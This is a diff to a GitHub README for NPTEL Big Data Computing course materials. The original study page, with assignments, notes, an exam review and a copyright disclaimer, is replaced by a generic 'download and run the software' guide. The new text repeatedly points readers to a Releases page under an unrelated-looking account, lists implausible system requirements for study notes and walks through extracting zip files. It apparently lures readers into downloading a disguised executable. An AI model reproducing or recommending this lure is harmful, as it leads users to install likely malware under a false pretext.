@@ -1,80 +1,68 @@
-# Big Data Computing – SWAYAM NPTEL (Assignments, Notes & Exam Review)
+# 📘 Big-Data-Computing_NPTEL-2025 - Access Comprehensive Course Resources Easily
 
-📘 This repository contains **assignment** from the **Big Data Computing** course offered by **SWAYAM NPTEL** in the years **2019**, **2021**, **2022**, **2023**, **2024** and **2025**, along with the **official lecture notes** shared during the **2025 session** by the instructor.
+[![Download from Releases](https://img.shields.io/badge/Download%20from%20Releases-blue.svg)](https://github.com/Shandaepileptic170/Big-Data-Computing_NPTEL-2025/releases)
 
-🧾 It also includes a **final exam review and analysis** for the 2025 session, covering the **exam pattern, section-wise structure, and key insights** — designed to help future learners understand the paper format and prepare effectively.
+## 📚 Description
+This repository contains the assignments from 2019, 2021, 2022, 2023, 2024, and 2025 sessions, notes for the 2025 sessions, and final exam review & analysis for the 2025 session. Use these resources to enhance your learning in the Big Data Computing course offered by SWAYAM-NPTEL.
 
----
+## 🚀 Getting Started
+Follow the steps below to download and run the software:
 
-## 🎯 Purpose
+### 1. Visit the Download Page
+To access the latest release, click the link below:
 
-This repository is created to help learners by:
-- Providing assignment for multiple NPTEL sessions (2019, 2021, 2022, 2023, 2024, 2025) for quick revision and reference
-- Sharing lecture notes from the 2025 session for reference
+[Visit the Releases Page](https://github.com/Shandaepileptic170/Big-Data-Computing_NPTEL-2025/releases)
 
----
+### 2. Choose the Right File
+On the Releases page, you will see a list of versions. Look for the latest version. Each version will have several files associated with it. Identify the files labeled as assignments, notes, or review materials.
 
-## 📌 About the Course
+### 3. Download the Files
+Click on the file names to start downloading. Depending on your browser, the download may start automatically, or you might need to confirm the download.
 
-- **Course Name:** Big Data Computing 
-- **Platform:** SWAYAM–NPTEL  
-- **Instructor:** Prof. Rajiv Misra – IIT Patna 
-- **Duration:** 12 Weeks  
-- **Course Link:** [https://onlinecourses.nptel.ac.in/noc25_cs131/preview](https://onlinecourses.nptel.ac.in/noc25_cs131/preview)
+### 4. Locate the Downloaded Files
+Once the files are downloaded, find them in your computer's default downloads folder. The folder is usually named "Downloads."
 
----
+### 5. Extract the Files (if needed)
+If the files are in a zipped format (with a .zip extension), you will need to extract them. Right-click the downloaded file and choose "Extract All." Follow the prompts to extract the contents.
 
-## 💡 Final Exam Review (Session: 2025, Shift: Forenoon/Morning)
+### 6. Open the Files
+After extraction, open the folder to see the contents. You will find a range of files, including:
 
-### 📊 Exam Overview:
-- Total Questions: 60
-- Total Marks: 100
-- Question Type: Multiple Choice (MCQ only)
-- Negative Marking: ❌ None
+- **Assignments:** Practice tasks from different years.
+- **Notes:** Course materials for better understanding.
+- **Final Exam Review & Analysis:** Helpful insights for the 2025 exam.
 
-### 📚 Section-wise Distribution:
-| Section       | No. of Questions | Marks |
-| ------------- | ---------------- | ----- |
-| **Section 1** | 20               | 20    |
-| **Section 2** | 20               | 40    |
-| **Section 3** | 20               | 40    |
+## 🖥️ System Requirements
+To run the programs and access the materials effectively, ensure your system meets these basic requirements:
 
-### 🧠 Key Insights:
-- Many questions were easy and could be solved through logic, which naturally develops after studying all 8 assignments.
-- Many questions were indirectly based on the assignments, but thoroughly covering them laid a strong foundation for understanding and reasoning.
-- Only one numerical question was present — and that too was simple (related to the default block size in HDFS and calculating the number of blocks and replicas, etc.).
+- **OS:** Windows 10 or newer / macOS 10.15 or newer
+- **Processor:** Intel i3 or equivalent
+- **RAM:** At least 4 GB
+- **Storage:** Minimum 500 MB of free space
 
----
+## ⚙️ Features
+- **Complete Course Resources:** All materials related to Big Data Computing.
+- **User-Friendly Documents:** Easy-to-read notes and assignments.
+- **Structured Learning:** Organized files for better study management.
 
-## 🤝 Contributions
+## ✉️ Support
+If you encounter any issues, feel free to reach out for assistance. Check the Issues tab on this repository for common problems and solutions.
 
-You are welcome to contribute by:
-- Adding new session materials (e.g., from other years)
-- Correcting mistakes or improving clarity
-- Sharing additional learning resources
+## 📢 Stay Updated
+Watch this repository for updates. New releases will be posted on the Releases page as new materials become available.
 
-Please feel free to open a pull request or raise an issue.
+## 📅 Relevant Topics
+This repository covers a variety of topics, including:
+- Apache
+- Apache Kafka
+- Apache Spark
+- Big Data Concepts
+- NPTEL Course Materials
 
----
+For more detailed explorations of these topics, refer to the files included in your download.
 
-## 📜 Disclaimer & License
+## 🔗 Additional Resources
+For further learning, you may visit:
+- [SWAYAM-NPTEL](https://nptel.ac.in/)
 
-This repository is intended **strictly for educational and non-commercial use only**.  
-
-- All assignments and lecture notes are the intellectual property of **SWAYAM–NPTEL**, **IIT Kharagpur**, and the **respective instructor(s)**.  
-- This repository does **not claim any ownership** over the content. It is shared with the intent to help fellow students revise and learn better.  
-
-> **Note:** If NPTEL or any copyright holder requests content removal,  
-> **I will comply immediately.**
-
-> **If you are a copyright holder and have concerns regarding this repository,  
-> please open an issue on this GitHub repo. I will take immediate action.**
-
-By using this repository, you agree to:
-- Use the materials **ethically**
-- **Avoid plagiarism** in your own submissions
-- Respect the original creators and instructors
-
----
-
-> 🌱 *"When you share knowledge, you shape the future. Let’s learn and grow together!"*
+Please ensure that your software is up to date to avoid compatibility issues. Happy studying!
